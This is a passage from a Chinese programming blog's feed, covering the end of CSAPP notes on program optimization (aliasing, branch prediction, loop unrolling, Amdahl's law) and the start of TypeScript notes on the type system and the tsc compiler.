class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// func1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_array</span><span class="params">(<span class="type">long</span>* dest, <span class="type">long</span> n)</span> &#123;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        dest[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// func2</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_read</span><span class="params">(<span class="type">long</span> *src, <span class="type">long</span> *dst, <span class="type">long</span> n)</span> &#123;</span><br><span class="line">    <span class="type">long</span> cnt = n;</span><br><span class="line">    <span class="type">long</span> val = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (cnt) &#123;</span><br><span class="line">        *dst = val;</span><br><span class="line">        val = (*src) + <span class="number">1</span>;</span><br><span class="line">        cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>func1</code> 的 CPE 能达到 1.0，很好解释，是因为 store <strong>暂时不影响寄存器值（前面提到 pending write 到 renaming table）</strong>，不会产生数据依赖，因此可以完全流水线化，这也是最佳情况（throughput bound）。</p><p>但是 <code>func2</code>，如果 <code>src != dst</code>，那么 CPE 约为 1.3；但是如果 <code>src == dst</code>，那么 CPE 上升到 7.3（下降了 6 个 cycles）！这可以用 data-flow 分析出。</p><p>先写出汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.L3:</span><br><span class="line">    movq%rax, (%rsi)</span><br><span class="line">    movq(%rdi), %rax</span><br><span class="line">    addq$1, %rax</span><br><span class="line">    subq$1, %rdx</span><br><span class="line">    jne.L3</span><br></pre></td></tr></table></figure><p><code>movq %rax, (%rsi)</code> 会被分解为两条 primitive instruction：<code>s_addr</code>（计算目标内存地址，由单独的运算单元完成）、<code>s_data</code>（数据 store）。</p><p>如果 store 的数据依赖于前一步的 load（read-write dependency），那么根据汇编代码可以画出：</p><blockquote><p>其中 <code>movq</code></p></blockquote><p><img src="imgs/data-flow-load-store.png"></p><p>如果 <code>src != dst</code>，那么箭头 3 不存在，关键路径将是 <code>sub</code>（CPE 约 1.3）；</p><p>如果 <code>src == dst</code>，那么箭头 3 的依赖关系就存在，关键路径就是 <code>s_data -&gt; load -&gt; add</code>（CPE 约 7.3）。</p><p>此外，还有一些在机器层面影响性能的其他因素：</p><h3 id="12-5-1-Branch-Misprediction-Recovery"><a href="#12-5-1-Branch-Misprediction-Recovery" class="headerlink" title="12.5.1 Branch Misprediction Recovery"></a>12.5.1 Branch Misprediction Recovery</h3><p>我们在 4.2.2 中提到过，机器层面的分支预测技术（Branch Prediction）就是为了让 CPU 流水线的效率得到充分利用而诞生的。在很多情况下，如果我们不使用条件移动的话，那么在分支预测错误的时候，很有可能整个流水线的指令和数据全部需要重新载入，这将耗费大量的运算资源和时间。</p><p>所以第一个思路就是从降低 <strong>Branch Misprediction Penalty</strong> 方面着手。首先了解一下分支预测技术的大概原理是啥。分支预测技术在早期使用的是简单的 heuristic：向后分支（backwards branches）经常是判断（if），向前分支（forwards branches）经常是循环（loop）。我们可以通过一些算法<strong>跟踪这些分支（尤其是循环）的历史行为，如果它经常通过某一分支，那么以后预测该分支的可能性会大一点</strong>。</p><p>这种预测方法在有些代码中效果显著，但是另一些代码（<strong>例如强数据依赖、强随机数据</strong>）中效果极差，甚至导致更多的 Branch Misprediction Penalty；</p><p>因此接近这个方面问题的可能途径如下：</p><ul><li>减少分支结构的数量：<ul><li>Transform loops（尽量转换、消除不必要的循环）</li><li>Unroll loops（下面介绍）</li><li>Use Conditional Moves（4.2.2）</li></ul></li><li>使得分支<strong>更容易被分支预测器预测</strong><ul><li>为循环中的数据排序（需要权衡）</li><li>尽量避免间接的分支结构（因为间接分支基本上都没有预测依据）<ul><li>函数指针判断跳转</li><li>虚函数运行时判断跳转</li></ul></li></ul></li></ul><p>这里介绍一下 unroll loops 的思路。unroll loops 就是<strong>将循环中的代码成倍数展开，达到均摊 Branch Misprediction Penalty 的目的</strong>。同时，这种方法还能为其他的优化方法创造条件（例如 CSE、Code Motion、Scheduling 等）。方法的示例如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; nelts; i++)</span><br><span class="line">    A[i] = B[i]*k + C[i];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改为：</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; nelts - <span class="number">4</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">    A[i  ] = B[i  ]*k + C[i  ];</span><br><span class="line">    A[i+<span class="number">1</span>] = B[i+<span class="number">1</span>]*k + C[i+<span class="number">1</span>];</span><br><span class="line">    A[i+<span class="number">2</span>] = B[i+<span class="number">2</span>]*k + C[i+<span class="number">2</span>];</span><br><span class="line">    A[i+<span class="number">3</span>] = B[i+<span class="number">3</span>]*k + C[i+<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但这种方法有两个明显的缺陷，一是如果过度展开，会增长代码长度，同样会影响性能。所以需要根据数据量进行权衡；二是在某些循环中，依赖 i 进行判断的场合，这种展开就不适用了。</p><h3 id="12-5-2-Scheduling"><a href="#12-5-2-Scheduling" class="headerlink" title="12.5.2 Scheduling"></a>12.5.2 Scheduling</h3><p>在上面的流程中，除了 Branch Misprediction Penalty，还有一种会影响 CPU 运算性能的情况——数据读取和写入。I/O 操作的开销一直是处理器设计者头疼的地方，尽管现在有高速缓存器来进行弥补，但数据的存取在运算过程中还是尽量能少就少。</p><p>因此，<strong>将源代码中读取、写入的部分和运算的部分分开（最好在运算前就读入所有必需的数据、在所有运算后才写入必要的数据），能够让处理器的性能发挥到最大</strong>（这个优化也可以由编译器完成）。这种方法就称为代码调度（Scheduling）。</p><p>例如 12.5.1 中的代码还可以继续优化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; nelts - <span class="number">4</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">    B0 = B[i]; B1 = B[i + <span class="number">1</span>]; B2 = B[i + <span class="number">2</span>]; B3 = B[i + <span class="number">3</span>];</span><br><span class="line">    C0 = C[i]; C1 = C[i + <span class="number">1</span>]; C2 = C[i + <span class="number">2</span>]; C3 = C[i + <span class="number">3</span>];</span><br><span class="line">    A[i  ] = B0*k + C0;</span><br><span class="line">    A[i+<span class="number">1</span>] = B1*k + C1;</span><br><span class="line">    A[i+<span class="number">2</span>] = B2*k + C2;</span><br><span class="line">    A[i+<span class="number">3</span>] = B3*k + C3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，这样的操作对于有些情况也不适用，比如在一些业务逻辑下，读取操作必须在一群算数运算之间出现。</p><h2 id="12-6-Summary"><a href="#12-6-Summary" class="headerlink" title="12.6 Summary"></a>12.6 Summary</h2><p>本章讲述了一些程序优化的基本思路，主要从两个方向描述。</p><p>一个是与机器无关方向的优化小技巧，而这些技巧也常常会内置在编译器中，成为编译工作的一个部分。它们大致可以分为以下几类：</p><ul><li>局部的优化：例如 <strong>常数折叠、计算强度减小（通过更换运算符实现）、死代码剔除、局部的相近表达式复用消除</strong>；</li><li>全局的优化：例如 <strong>循环结构转换、代码移动（减少不必要的运算）、内联化、全局的相近表达式复用消除</strong>；</li></ul><p>在这个方面，我们考虑了相反的情况——什么样的编码会阻碍编译器帮助我们进行上面的优化。</p><ul><li>Procedure Calls：我们应该在代码设计时，充分考虑函数调用的位置对于性能影响；</li><li>Memory Alias：尤其是在循环结构中，多使用局部变量暂存中间结果，或者使用更严格的关键字；</li></ul><p>这都在提醒我们编码时，能尽早确定的定值，尽量存在局部变量中，以防编译器认为中间存在变数，而不敢于进行优化。</p><p>另一个是与具体机器有关方向的优化技巧（但是目前世界上的机器种类就这些，所以理论上也有一定的普适性，例如 ARM 架构和 x86 架构都能使用这种优化来提升性能），编译器不一定会帮你做这些优化，这是因为这些方法有着各自的局限性。</p><p>我们分析了现代 CPU 的结构特性，找到了 3 处可以进行优化的地方，一个是分支预测的部分，一个是代码中的 I/O 调度，另一个是运算顺序和方法。</p><p>首先我们了解了分支预测器的原理和性质，我们发现想要弥补 Branch Misprediction Penalty，就需要从两个方面入手：</p><ol><li>让它少预测点，就少错一点（减少分支结构）。这方面的方法大致有 <strong>循环转换、unrolling loops 和 conditional moves（回想之前的 General Condition Translation）</strong>；</li><li>提升它预测的正确率。依从分支预测器的原理，我们可以让每次产生的分支判断的结果有迹可循。总的来说，我们可以通过<strong>为需要的判断数据排序</strong>（局限性强）、<strong>减少编码一些难以预测的结构</strong>（例如函数指针判断、虚函数）。</li></ol><p>在 I/O 调度方面我们发现，CPU 频繁地从高速缓存器中读入和写出数据也会降低程序性能，因此在编码过程中写出能够让汇编码中读内存次数越少的源码越好。因此，这里的重要建议是<strong>将源代码中读取、写入的部分和运算的部分分开（最好在运算前就读入所有必需的数据、在所有运算后才写入必要的数据）</strong>。</p><p>本章最后以一个计算例子说明，通过<strong>分析关键路径</strong>，使用 Re-association Transformation、Separate Accumulator 来让更多的乘法运算并行起来。</p><p>当然，当我们利用以上技术（例如 loop unrolling）优化到一定程度后，其他方面的问题就变成了关键路径上的问题。例如 unrolling 过多时，发生 register spilling（寄存器用完了，开始使用内存）影响性能。</p><p><img src="imgs/ch15-summary.png" height="250px"></p><p>最后介绍一个优化的规则：Amdahl‘s Law</p><script type="math/tex; mode=display">S=\dfrac{T_{old}}{T_{new}}=\dfrac{1}{(1-\alpha)+\dfrac{\alpha}{K}}\Longrightarrow S_{\infty}=\dfrac{1}{1-\alpha}</script><p>$(1-\alpha)$ 代表不能被优化的部分，$K$ 代表能被优化的部分最快被优化多少倍。</p><p>当能优化的部分优化到极限后，加速比极限为 $S_\infty$。<strong>表达式说明一个通俗的道理：选择优化时间占比更大的部分（$\alpha$ 更大），优化的效果、优化的极限就更好（$S_\infty$ 更大）</strong>。</p><p>也就是说，我们应该在优化时找关键路径、找 hot spot（热点位置）。这就是 profiling。</p><p>当今的 profiling 工具有哪些？Unix 上有 <code>gprof</code>、<code>perf</code>，它们的思路是 <strong>random sampling</strong>，间隔一定时间进行指令中断，统计函数执行的次数、统计当前调用栈（可以发现调用关系、递归情况），用频率代表出现总时长占比。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-10-The-Memory-Hierarchy&quot;&gt;&lt;a href=&quot;#Chapter-10-The-Memory-Hierarchy&quot; class=&quot;headerlink&quot; title=&quot;Chapter 10. The Memory Hierarc</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="GNU" scheme="https://blog.sjtuxhw.top/tags/GNU/"/>
    
    <category term="CSAPP" scheme="https://blog.sjtuxhw.top/tags/CSAPP/"/>
    
    <category term="ICS" scheme="https://blog.sjtuxhw.top/tags/ICS/"/>
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
  </entry>
  
  <entry>
    <title>TypeScript笔记</title>
    <link href="https://blog.sjtuxhw.top/technical/typescript-basic/"/>
    <id>https://blog.sjtuxhw.top/technical/typescript-basic/</id>
    <published>2024-03-18T14:56:29.000Z</published>
    <updated>2024-10-25T14:01:35.568Z</updated>
    
    <content type="html"><![CDATA[<p><i>Written by SJTU-XHW</i></p><p><i>Reference: </i> MDN Doc &amp;&amp; TypeScript Doc</p><p><i>本人学识有限，笔记难免有错，恳请读者能够批评指正，本人将不胜感激！</i></p><hr><span id="more"></span><h1 id="Chapter-1-与-JS-比较：类型声明-与-作用域"><a href="#Chapter-1-与-JS-比较：类型声明-与-作用域" class="headerlink" title="Chapter 1. 与 JS 比较：类型声明 与 作用域"></a>Chapter 1. 与 JS 比较：类型声明 与 作用域</h1><p>TypeScript 是个静态类型语言，<strong>变量类型/对象成员/函数签名 在定义后就不能更改！</strong></p><ul><li><p>定义变量时，请使用规范的类型声明定义方式：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Variable */</span></span><br><span class="line"><span class="keyword">var</span> <span class="attr">foo</span>: <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="attr">bar</span>: <span class="built_in">string</span> = <span class="string">&quot;Hello, TypeScript!&quot;</span>;</span><br><span class="line"><span class="comment">/* Function */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toString</span>(<span class="params">num: <span class="built_in">number</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>天大的福音：<strong>只声明变量、不赋值就使用会报错！这下不用担心讨厌的 <code>undefined</code> 了</strong>；</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>而且开启了编译选项 <code>strictNullChecks</code> 后，<code>undefined</code> 也是个独立的类型，不能赋给除了 <code>undefined</code> 类型以外的其他类型！</p></li><li><p>不允许给变量中途赋予不同类型的值；</p></li></ul><p>此外，<strong>比 JavaScript 更加暖心的操作是：TypeScript 全面支持 <u>块级作用域</u>！</strong>定义在块级作用域内的变量、类型等等不再能被外界读到了！</p><h1 id="Chapter-2-TypeScript-编译"><a href="#Chapter-2-TypeScript-编译" class="headerlink" title="Chapter 2. TypeScript 编译"></a>Chapter 2. TypeScript 编译</h1><p>TypeScript 不提供运行环境，全部交给 JavaScript，自己只提供转换为 JavaScript 的编译器 <code>tsc</code>，甚至这个编译器也是 JavaScript 的一个库，可以用 <code>npm</code> 安装。</p><p>编译时，会将类型声明和类型相关的代码全部删除，只留下能运行的 JavaScript 代码，并且不会改变 JavaScript 的运行结果。</p><p>因此，TypeScript 的类型检查只是编译时的类型检查，而不是运行时的类型检查。一旦代码编译为 JavaScript，运行时就不再检查类型了。</p><p>TypeScript 的编译器 <code>tsc</code> 的简单使用如下：</p><ul><li><p>安装：<code>npm install -g typescript</code>；</p></li><li><p>编译单个 TS 文件，或多个没有层次依赖关系的 TS 文件：<code>tsc a.ts[, b.ts, ...]</code>；</p><blockquote><p>分别生成 <code>a.js, b.js, ...</code>；</p></blockquote></li><li><p><code>--outFile</code> 编译为一个指定的 JavaScript：<code>tsc a.ts[, b.ts, ...] --outFile XXX.js</code>；</p></li><li><p><code>--outDir</code> 指定输出目录；</p></li><li><p><code>--target</code> 指定编译 JavaScript 标准（建议 <code>es2015</code> 及以上）；</p></li></ul><p>如果项目更复杂一点，就需要 <code>tsconfig.json</code> 管理编译过程（考虑 Java 的 Gradle 和 C++ 的 CMakeLists）。其简单结构如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;file1.ts&quot;</span><span class="punctuation">,</span> <span class="string">&quot;file2.ts&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;outFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/app.js&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这时候直接运行 <code>tsc</code> 等价于原来的 <code>tsc file1.ts file2.ts --outFile dist/app.js</code>；</p><p>更复杂的使用以后介绍。</p><h1 id="Chapter-3-TypeScript-类型系统"><a href="#Chapter-3-TypeScript-类型系统" class="headerlink" title="Chapter 3. TypeScript 类型系统"></a>Chapter 3. TypeScript 类型系统</h1><h2 id="3-1-新的辅助类型"><a href="#3-1-新的辅助类型" class="headerlink" title="3.1 新的辅助类型"></a>3.1 新的辅助类型</h2><p>和 JavaScript 不一样的是，TypeScript 提供了 3 种特殊类型：<code>any</code>、<code>unknown</code>、<code>never</code>，它们是为了配合静态类型系统更好的发挥功能而创造出来的。</p><h3 id="3-1-1-Any-类型"><a href="#3-1-1-Any-类型" class="headerlink" title="3.1.1 Any 类型"></a>3.1.1 Any 类型</h3><p>当给变量声明 <code>any</code> 类型时，<strong>TypeScript 会关闭这个变量的类型检查，这个变量单独变为 “动态类型”</strong>。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">x</span>: <span class="built_in">any</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">x</span>(<span class="number">1</span>); <span class="comment">// OK</span></span><br><span class="line">x.<span class="property">foo</span> = <span class="number">100</span>; <span class="comment">// OK</span></span><br><span class="line">x = <span class="number">1</span>; <span class="comment">// OK</span></span><br><span class="line">x = <span class="string">&quot;foo&quot;</span>; <span class="comment">// OK</span></span><br><span class="line">x = <span class="literal">true</span>; <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>如你所见，肯定要避免使用 <code>any</code> 类型，不然你为什么不用 JavaScript？</p><p>频繁使用 <code>any</code> 会导致 TypeScript 丧失静态类型的优势，具体来说有几个坏处：</p><ul><li><p>干扰类型推断和编译前错误检查：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">any</span>, y: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]); <span class="comment">// OK</span></span><br></pre></td></tr></table></figure></li><li><p>静态类型污染：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">x</span>: <span class="built_in">any</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">y = x; <span class="comment">// 不报错</span></span><br><span class="line"></span><br><span class="line">y * <span class="number">123</span>; <span class="comment">// 不报错</span></span><br><span class="line">y.<span class="title function_">toFixed</span>(); <span class="comment">// 不报错</span></span><br></pre></td></tr></table></figure></li></ul><p>即使你不使用 <code>any</code> 类型，也要注意编译器可能<strong>自动推断 <code>any</code> 类型</strong>，这通常是因为开发者不良开发习惯所导致的 —— <strong>声明、定义变量 / 定义函数 时，不进行类型标注</strong>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"><span class="keyword">let</span> y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上变量、函数声明全部会被编译器推断为 <code>any</code>，从而干扰类型检查！</p><p>总之，<u>对于 TypeScript 的 <code>any</code> 类型，请敬而远之！自己不写 <code>any</code>，也别让编译器推断出 <code>any</code></u>。这是编译器实在没法进行类型检查时候的下下策。</p><blockquote><p>还是那句话，不然你为什么不直接用 JavaScript？</p></blockquote><h3 id="3-1-2-Unknown-类型"><a href="#3-1-2-Unknown-类型" class="headerlink" title="3.1.2 Unknown 类型"></a>3.1.2 Unknown 类型</h3><p>为了防止 <code>any</code> 的类型污染等问题，人们定义了一种比 <code>any</code> 类型严格的辅助类型 <code>unknown</code>，规则如下：</p><ul><li>允许给 <code>unknown</code> 类型变量赋予任何类型的值；</li><li><strong>不允许将 <code>unknown</code> 类型变量赋予其他确定类型（即除了 <code>any</code> 和 <code>unknown</code>）的值</strong>；</li><li><strong>不允许使用 <code>unknown</code> 类型的方法、属性</strong>；</li><li>只能对 <code>unknown</code> 类型进行有限的运算：逻辑运算、判断相等运算、<code>typeof</code>、<code>instanceof</code>，其他运算均不可以；</li></ul><p>违反以上规则，编译器会抛出错误。</p><p>但是 <code>unknown</code> <strong>允许<u>类型缩窄</u></strong>（比如一开始没法确定这个数据的类型，但是后面要处理时确定了，这种情况就不需要使用 <code>any</code> 了），如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">s</span>: <span class="built_in">unknown</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> s === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">  s.<span class="property">length</span>; <span class="comment">// 正确</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在作用域中，<code>s</code> 类型被缩窄为 <code>string</code>，变成了确定类型，就可以使用确定类型的一切方法和属性了。</p><p>总之，<strong>某些逻辑下，实在无法确定类型，应该优先使用 <code>unknown</code> 类型，避免 <code>any</code> 出现</strong>。</p><h3 id="3-1-3-Never-类型"><a href="#3-1-3-Never-类型" class="headerlink" title="3.1.3 Never 类型"></a>3.1.3 Never 类型</h3><p>从集合论的角度，人们定义了这个类型，含义是 <strong>空类型</strong>，可以赋给任何类型的变量。</p><p>你可能会好奇，那被赋予 <code>never</code> 类型的变量内部的值怎么办？</p><p>问出这个问题说明你还没有明白 <code>never</code> 的使用场景：<strong>在函数中，它标识控制流永远无法到达函数返回的时候；在变量中，它标识永远都不会用到该变量</strong>。</p><p>例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>): <span class="built_in">never</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, TypeScript!&quot;</span>);    <span class="comment">// 编译器会报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是错误的，因为函数能够执行到最后，返回的是 <code>undefined</code> 类型的对象，而不是空。</p><blockquote><p>如果你只是想标识函数不返回值，请使用 <code>undefined</code> / <code>void</code> 作为返回类型：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, TypeScript!&quot;</span>);  <span class="comment">// Correct</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>这样才是正确使用方式：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>): <span class="built_in">never</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">    <span class="comment">/* Control Never Reaches Here! */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-新的基本类型-和-引用类型"><a href="#3-2-新的基本类型-和-引用类型" class="headerlink" title="3.2 新的基本类型 和 引用类型"></a>3.2 新的基本类型 和 引用类型</h2><p>复习一下 JavaScript 中有几种基本类型和引用类型：</p><p><code>boolean</code>、<code>string</code>、<code>number</code>、<code>bigint</code>、<code>symbol</code>、<code>object</code>（狭义对象类型也是个基本类型，和广义对象类型 <code>Object</code> 不同，仅包含所有引用类型，如 Array 等内置引用类型）、<code>undefined</code>、<code>null</code>；</p><blockquote><p>补充 JavaScript 不常用的类型使用方法：</p><ul><li><code>bigint</code>：<strong>在 JavaScript 中，使用 <code>bigint</code> 需要数字尾缀 <code>n</code></strong>，例如 <code>123n</code>；</li></ul></blockquote><h3 id="3-2-1-TypeScript-的对象"><a href="#3-2-1-TypeScript-的对象" class="headerlink" title="3.2.1 TypeScript 的对象"></a>3.2.1 TypeScript 的对象</h3><p>这里得说明一下，对象（引用类型）的定义和 JavaScript <strong>显著不同</strong>。</p><p>因为 TypeScript 作为一种静态类型语言，不允许定以后更改数据成员。因此你这么写，编译器会报错：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">o1</span>: <span class="title class_">Object</span> = &#123; <span class="attr">foo</span>: <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> <span class="attr">o2</span>: <span class="built_in">object</span> = &#123; <span class="attr">foo</span>: <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">o1.<span class="property">foo</span>; <span class="comment">// TypeError</span></span><br><span class="line">o2.<span class="property">foo</span>; <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>因为你定义的 <code>o1/o2</code> 类型是原生的 <code>object/Object</code>，都只有原生的属性和方法，<code>foo</code> 属性在赋值时就被抛弃了。</p><p><strong>要想自定义对象的属性和方法，要么定义对象类型，要么定义 <code>class</code>（TypeScript 的类，后面讲）</strong>；</p><h3 id="3-2-2-TypeScript-值类型"><a href="#3-2-2-TypeScript-值类型" class="headerlink" title="3.2.2 TypeScript 值类型"></a>3.2.2 TypeScript 值类型</h3><p>TypeScript 规定，单个值也是一种类型，称为“值类型”，不常用，它常常用在联合 / 交叉类型中。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">name</span>: <span class="string">&quot;Hello&quot;</span>;    <span class="comment">// 只能被赋予 &quot;Hello&quot;，其他内容都会报错。</span></span><br></pre></td></tr></table></figure><h3 id="3-2-3-TypeScript-常量类型"><a href="#3-2-3-TypeScript-常量类型" class="headerlink" title="3.2.3 TypeScript 常量类型"></a>3.2.3 TypeScript 常量类型</h3><p>所有使用 <code>const</code> 关键字修饰的 TypeScript 的变量都是常量，它们不能被更改。</p><p>你可以把这个变量理解为 <strong>以初次赋予的值为值类型的变量</strong>。</p><h3 id="3-2-4-TypeScript-对象类型"><a href="#3-2-4-TypeScript-对象类型" class="headerlink" title="3.2.4 TypeScript 对象类型"></a>3.2.4 TypeScript 对象类型</h3><h4 id="3-2-4-1-使用方法"><a href="#3-2-4-1-使用方法" class="headerlink" title="3.2.4.1 使用方法"></a>3.2.4.1 使用方法</h4><p>而 “对象类型” 则<strong>可以很方便地（无需定义接口 interface、类型 class）定义对象并指定临时类型</strong>，如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">obj</span>: &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">y</span>: <span 